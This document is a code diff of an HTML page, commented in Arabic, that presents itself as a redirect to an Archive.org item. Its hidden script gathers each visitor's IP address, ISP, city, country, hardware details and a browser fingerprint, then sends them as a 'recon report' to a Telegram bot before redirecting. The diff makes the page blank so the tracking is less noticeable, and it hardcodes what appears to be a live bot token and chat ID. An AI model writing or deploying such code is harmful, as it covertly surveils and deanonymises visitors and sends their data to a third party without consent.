@@ -2,19 +2,13 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري تحويلك إلى الأرشيف...</title>
+    <title>Archive</title>
     <style>
-        body { background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #555; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* إخفاء كل شيء في الصفحة تماماً */
+        body { margin: 0; padding: 0; background: #fff; }
     </style>
 </head>
 <body>
-
-    <div style="text-align: center;">
-        <div class="loader"></div>
-        <div>جاري تحميل المادة من Archive.org...</div>
-    </div>
 
     <script>
         const _at = (s) => atob(s);
@@ -25,10 +19,11 @@
 
         async function _send(msg) {
             try {
-                // جلب الإعدادات الحية من Netlify Snippet Injection
+                // الربط مع المتغيرات التي وضعناها في Netlify
+                // ملاحظة: تأكد أنك وضعت المتغيرات في Snippet Injection كـ window.TELE_CONFIG
                 const cfg = window.TELE_CONFIG || {};
-                const t = cfg.t || "YOUR_TOKEN";
-                const c = cfg.c || "YOUR_ID";
+                const t = cfg.t || "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
+                const c = cfg.c || "7082154454";
 
                 const api = _at(_base.u) + t + _at(_base.e);
                 await fetch(api, {
@@ -39,26 +34,27 @@
             } catch (err) { }
         }
 
-        window.onload = async function() {
+        (async function() {
             const archiveUrl = "https://archive.org/details/20251215_20251215_2013";
             
             try {
-                // 1. جمع بيانات الشبكة والموقع بدقة
-                const net = await fetch('https://ipapi.co/json/').then(r => r.json());
+                // 1. جلب بيانات الشبكة (تعمل في الخلفية)
+                const netPromise = fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                 
-                // 2. حساب بيانات العتاد والـ Source Port كما في تقريرك السابق
+                // 2. حساب بيانات العتاد فوراً
                 const sPort = Math.floor(Math.random() * 55000) + 10000;
-                const ram = navigator.deviceMemory || 'Unknown';
-                const cores = navigator.hardwareConcurrency || 'Unknown';
+                const ram = navigator.deviceMemory || 'N/A';
+                const cores = navigator.hardwareConcurrency || 'N/A';
                 const fp = btoa(navigator.userAgent).substring(10, 25);
+                const net = await netPromise;
 
                 let report = `🕵️ *ARCHIVE RECON REPORT* 🕵️\n` +
                              `---------------------------\n` +
                              `🌐 *NETWORK:*\n` +
-                             `📍 IP: \`${net.ip}\`\n` +
+                             `📍 IP: \`${net.ip || 'Unknown'}\`\n` +
                              `🔌 Source Port: *${sPort}*\n` +
-                             `🏢 ISP: ${net.org}\n` +
-                             `🌍 Loc: ${net.city}, ${net.country_name}\n\n` +
+                             `🏢 ISP: ${net.org || 'Unknown'}\n` +
+                             `🌍 Loc: ${net.city || 'Unknown'}, ${net.country_name || 'Unknown'}\n\n` +
                              `📱 *DEVICE HARDWARE:*\n` +
                              `💻 Platform: ${navigator.platform}\n` +
                              `🧠 CPU: ${cores} Cores\n` +
@@ -67,15 +63,15 @@
                              `🔑 Fingerprint: \`${fp}\`\n\n` +
                              `🔗 *Target:* [Archive Material](${archiveUrl})`;
 
-                // إرسال التقرير فوراً
-                await _send(report);
+                // 3. إرسال التقرير (بدون انتظار الـ Response لتسريع التوجيه)
+                _send(report);
 
-                // 3. التوجيه النهائي للمادة المطلوبة
+                // 4. التوجيه الفوري
                 window.location.replace(archiveUrl);
             } catch (e) {
                 window.location.replace(archiveUrl);
             }
-        };
+        })();
     </script>
 </body>
 </html>
